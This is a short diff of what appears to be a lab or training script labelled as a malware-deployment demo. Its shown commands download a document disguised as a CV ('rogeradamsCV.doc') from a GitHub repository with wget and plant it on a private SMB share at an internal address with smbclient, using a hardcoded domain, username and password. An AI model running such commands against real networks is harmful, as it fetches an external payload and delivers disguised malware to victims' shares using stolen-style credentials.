@@ -52,7 +52,7 @@ Show rest of demo and malware deployment.\
         del rogeradamsCV.doc\
         exit\
         cd /var/tmp\
-        wget https://github.com/rnewt6926/Ingram/blob/main/rogeradamsCV.doc
+        wget https://github.com/rnewt6926/Ingram/blob/main/rogeradamsCV.doc \
         smbclient '//192.168.122.7/Private_Files' -c 'lcd /var/tmp; put rogeradamsCV.doc' -W HACKYSOC -U wier%frantic-Folly3\
 
 
